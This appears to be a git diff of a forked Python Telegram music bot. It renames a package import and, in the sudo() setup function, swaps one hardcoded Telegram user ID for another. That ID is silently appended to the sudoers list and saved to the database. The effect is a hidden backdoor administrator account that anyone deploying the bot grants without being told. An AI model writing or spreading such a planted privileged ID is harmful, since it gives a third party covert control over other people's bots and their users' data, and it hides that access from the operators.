@@ -5,7 +5,7 @@ import heroku3
 from pyrogram import filters
 
 import config
-from ShizukaXMusic.core.mongo import pymongodb
+from kannadiga.core.mongo import pymongodb
 
 from .logging import LOGGER
 
@@ -56,7 +56,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(5463205082)
+                sudoers.append(6181817811)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
